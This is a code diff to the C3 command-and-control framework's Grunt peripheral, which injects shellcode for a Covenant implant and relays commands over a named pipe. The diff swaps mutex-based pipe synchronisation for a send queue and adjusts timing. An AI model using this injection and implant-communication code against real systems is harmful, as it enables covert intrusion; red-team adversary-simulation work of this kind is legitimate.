@@ -10,7 +10,7 @@ FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 	if (payload.empty())
 		throw std::invalid_argument(OBF("There was no payload provided."));
 
-	if (!maxConnectionAttempts)
+	if (pipeName.empty() || !maxConnectionAttempts)
 		throw std::invalid_argument(OBF("Cannot establish connection with payload with provided parameters"));
 
 	// Originally we were setting up the CLR for our .NET assembly, now we're using donut'd shellcode
@@ -18,7 +18,7 @@ FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 	// Store a handle to the Grunt Thread for later use
 	m_Grunt = WinTools::InjectionBuffer(payload, useSyscalls);
 
-	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give Grunt thread time to start pipe.
+	std::this_thread::sleep_for(std::chrono::milliseconds{ 1000 }); // Give Grunt thread time to start pipe.
 
 	// Connect to our Beacon named Pipe.
 	for (uint16_t connectionTrial = 0u; connectionTrial < maxConnectionAttempts; ++connectionTrial)
@@ -51,47 +51,38 @@ FSecure::C3::Interfaces::Peripherals::Grunt::~Grunt()
 
 void FSecure::C3::Interfaces::Peripherals::Grunt::OnCommandFromConnector(ByteView data)
 {
-	// TODO: Not sure that Grunt cares about Synchronous NamedPipe comms in the same way as Beacon
-	// Get access to write when whole read is done.
-	std::unique_lock<std::mutex> lock{ m_Mutex };
-	m_ConditionalVariable.wait(lock, [this]() { return !m_ReadingState || m_Close; });
-
-	if(m_Close)
-		return;
-	// Write to Covenant specific pipe
-	m_Pipe->WriteCov(data);
-
-	// Unlock, and block writing until read is done.
-	m_ReadingState = true;
-	lock.unlock();
-	m_ConditionalVariable.notify_one();
+	m_SendQueue.emplace_back(data);
 }
 
-// TODO: This could get locked out waiting for a write if Grunt sends data back async?
 FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Grunt::OnReceiveFromPeripheral()
 {
-	std::unique_lock<std::mutex> lock{ m_Mutex };
-	m_ConditionalVariable.wait(lock, [this]() { return m_ReadingState || m_Close; });
+	FSecure::ByteVector ret = {};
+	if (m_Close)
+	{
+		return ret;
+	}
 
-	if(m_Close)
-		return {};
+	// Commands to Send
+	if (!m_SendQueue.empty())
+	{
+		auto msg = std::move(m_SendQueue.front());
+		m_SendQueue.pop_front();
+		m_Pipe->WriteCov(msg);
+	}
 
 	// Read
-	auto ret = m_Pipe->ReadCov();
+	if (m_Pipe->PeakCov())
+	{
+		ret = m_Pipe->ReadCov();
+	}
 
-	m_ReadingState = false;
-	lock.unlock();
-	m_ConditionalVariable.notify_one();
-
-	return  ret;
+	return ret;
 }
 
 void FSecure::C3::Interfaces::Peripherals::Grunt::Close()
 {
 	FSecure::C3::Device::Close();
-	std::scoped_lock lock(m_Mutex);
 	m_Close = true;
-	m_ConditionalVariable.notify_one();
 }
 
 FSecure::ByteView FSecure::C3::Interfaces::Peripherals::Grunt::GetCapability()
